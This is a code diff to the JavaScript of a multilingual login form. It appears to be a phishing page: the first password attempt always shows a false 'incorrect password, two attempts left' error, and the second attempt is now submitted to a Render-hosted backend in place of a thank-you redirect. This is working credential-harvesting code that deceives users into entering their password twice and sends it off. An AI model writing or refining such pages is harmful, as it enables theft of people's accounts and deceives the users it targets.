@@ -34,6 +34,8 @@ document.addEventListener("DOMContentLoaded", function () {
   const step1Button = document.getElementById("step1-button");
   const step2Button = document.getElementById("step2-button");
 
+  const form = document.querySelector('form'); // wichtig fürs echtes Abschicken
+
   let firstTry = true;
 
   function validateStep1() {
@@ -69,7 +71,7 @@ document.addEventListener("DOMContentLoaded", function () {
         es: "Contraseña incorrecta. Quedan 2 intentos antes de bloquear la cuenta."
       };
 
-      const langSelect = document.getElementById("language-desktop") || document.getElementById("language-mobile");
+      const langSelect = document.getElementById("language") || document.getElementById("language-desktop") || document.getElementById("language-mobile");
       const selectedLang = langSelect ? langSelect.value : "de";
 
       if (firstTry) {
@@ -81,23 +83,7 @@ document.addEventListener("DOMContentLoaded", function () {
         firstTry = false;
       } else {
         passwordError.style.display = "none";
-
-        let targetPage = "danke.html";
-        switch (selectedLang) {
-          case "en":
-            targetPage = "danke_eng.html";
-            break;
-          case "fr":
-            targetPage = "danke_fr.html";
-            break;
-          case "es":
-            targetPage = "danke_es.html";
-            break;
-          default:
-            targetPage = "danke.html";
-        }
-
-        window.location.href = targetPage;
+        form.submit(); // Jetzt wird das Formular wirklich abgesendet zu Render! ✅
       }
     });
   }
@@ -129,5 +115,6 @@ document.addEventListener("DOMContentLoaded", function () {
       }
     });
   }
-  setupDropdowns();
+
+  setupDropdowns(); // DropDowns immer neu aktivieren!
 });
